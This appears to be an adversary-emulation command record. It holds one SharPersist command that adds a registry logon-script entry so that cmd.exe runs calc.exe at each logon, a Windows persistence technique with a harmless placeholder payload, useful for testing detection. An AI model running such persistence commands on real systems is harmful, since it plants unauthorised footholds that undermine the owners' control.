---
id: e43aa4e1-283a-4d94-a8b9-b54cd1b58984
name: Add registry key and value for persisting cmd.exe with calc.exe on logon script
type: command
executor: bash
data: SharPersist -t reg -c "C:\Windows\System32\cmd.exe" -a "/c calc.exe" -k "logonscript"
  -m add
output: null
created_at: '2023-04-06T03:56:27.769676+00:00'
updated_at: '2023-04-10T20:37:28.586667+00:00'
---

# Add registry key and value for persisting cmd.exe with calc.exe on logon script

```bash
SharPersist -t reg -c "C:\Windows\System32\cmd.exe" -a "/c calc.exe" -k "logonscript" -m add
```
